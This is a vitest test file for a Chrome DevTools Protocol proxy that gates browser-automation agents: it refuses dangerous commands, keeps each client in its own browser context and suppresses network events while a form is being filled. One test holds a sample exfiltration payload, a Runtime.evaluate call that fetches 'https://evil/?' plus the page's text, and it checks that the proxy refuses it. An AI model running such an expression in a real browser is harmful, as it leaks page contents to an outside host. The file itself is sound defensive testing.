// Copyright (C) 2026 1Claw
// SPDX-License-Identifier: Apache-2.0

import { describe, expect, it, vi } from "vitest";
import { CdpProxy } from "./cdp-proxy.js";
import { FakeCdpTransport } from "./cdp-transport.js";

const TARGET = "target-1";

function proxyWithClient(clientId = "agent-a", ctx = "ctx-a") {
  const transport = new FakeCdpTransport();
  const proxy = new CdpProxy(transport);
  const events: unknown[] = [];
  proxy.register(clientId, ctx, (e) => events.push(e));
  return { transport, proxy, events };
}

describe("command routing", () => {
  it("forwards an allowed command and returns Chromium's reply", async () => {
    const { transport, proxy } = proxyWithClient();
    const reply = await proxy.handleCommand("agent-a", {
      id: 1,
      method: "DOM.getDocument",
      params: { targetId: TARGET },
    });
    expect(reply.kind).toBe("forward");
    expect(transport.sent).toHaveLength(1);
  });

  /**
   * The property most worth protecting. Refusing *after* forwarding would mean
   * Chromium already ran it, and for Runtime.evaluate the side effect is the
   * exfiltration — `fetch('https://evil/?'+v)` never returns the value to the
   * agent at all, so filtering the response achieves nothing.
   */
  it("never forwards a refused command upstream", async () => {
    const { transport, proxy } = proxyWithClient();
    proxy.gate.openFillWindow(TARGET);

    const reply = await proxy.handleCommand("agent-a", {
      id: 2,
      method: "Runtime.evaluate",
      params: { targetId: TARGET, expression: "fetch('https://evil/?'+document.body.innerText)" },
    });

    expect(reply.kind).toBe("refuse");
    expect(transport.sent, "the browser must never see a refused command").toHaveLength(0);
  });

  it("shapes a refusal as an ordinary CDP error, so frameworks handle it", async () => {
    const { proxy } = proxyWithClient();
    const reply = await proxy.handleCommand("agent-a", { id: 3, method: "Network.getRequestPostData" });
    expect(reply.kind).toBe("refuse");
    expect(reply.message.id).toBe(3);
    expect(reply.message.error?.code).toBe(-32601);
    expect(reply.message.error?.message).toMatch(/body_access_denied/);
  });

  it("refuses a client that never registered", async () => {
    const { transport, proxy } = proxyWithClient();
    const reply = await proxy.handleCommand("stranger", { id: 4, method: "DOM.getDocument" });
    expect(reply.kind).toBe("refuse");
    expect(transport.sent).toHaveLength(0);
  });

  it("refuses a malformed command rather than passing it through", async () => {
    const { transport, proxy } = proxyWithClient();
    const reply = await proxy.handleCommand("agent-a", { id: 5 });
    expect(reply.kind).toBe("refuse");
    expect(transport.sent).toHaveLength(0);
  });
});

describe("per-client BrowserContext", () => {
  /**
   * Sharing one context means agent B inherits agent A's session cookies. No
   * secret leaks, so it is easy to miss — B is simply logged in as A.
   */
  it("confines each client to its own context", () => {
    const transport = new FakeCdpTransport();
    const proxy = new CdpProxy(transport);
    proxy.register("agent-a", "ctx-a", () => {});
    proxy.register("agent-b", "ctx-b", () => {});
    expect(proxy.contextOf("agent-a")).toBe("ctx-a");
    expect(proxy.contextOf("agent-b")).toBe("ctx-b");
    expect(proxy.contextOf("agent-a")).not.toBe(proxy.contextOf("agent-b"));
  });

  it("forgets a client on unregister, so its context is not reused by name", () => {
    const { proxy } = proxyWithClient();
    proxy.unregister("agent-a");
    expect(proxy.contextOf("agent-a")).toBeUndefined();
  });
});

describe("event delivery", () => {
  it("delivers ordinary events to registered clients", () => {
    const { transport, events } = proxyWithClient();
    transport.emit({ method: "Page.loadEventFired", params: { targetId: TARGET } });
    expect(events).toHaveLength(1);
  });

  it("suppresses events on a target that is being filled", () => {
    const { transport, proxy, events } = proxyWithClient();
    proxy.gate.openFillWindow(TARGET);
    transport.emit({
      method: "Network.requestWillBeSent",
      params: { targetId: TARGET, request: { postData: "password=hunter2" } },
    });
    expect(events).toHaveLength(0);
  });

  // Dropped, not deferred: a queue would hand over exactly what suppression
  // prevented, one moment later.
  it("does not replay suppressed events once the window closes", () => {
    const { transport, proxy, events } = proxyWithClient();
    proxy.gate.openFillWindow(TARGET);
    transport.emit({ method: "Network.requestWillBeSent", params: { targetId: TARGET } });
    proxy.gate.closeFillWindow(TARGET);
    expect(events).toHaveLength(0);

    // A later event on the same target flows normally, proving the drop was
    // the event and not the client.
    transport.emit({ method: "Page.loadEventFired", params: { targetId: TARGET } });
    expect(events).toHaveLength(1);
  });

  it("stops delivering to a client after it unregisters", () => {
    const { transport, proxy, events } = proxyWithClient();
    proxy.unregister("agent-a");
    transport.emit({ method: "Page.loadEventFired", params: { targetId: TARGET } });
    expect(events).toHaveLength(0);
  });
});

describe("shutdown", () => {
  it("closes the upstream transport and drops every client", async () => {
    const { transport, proxy } = proxyWithClient();
    await proxy.close();
    expect(transport.closed).toBe(true);
    expect(proxy.contextOf("agent-a")).toBeUndefined();
  });
});
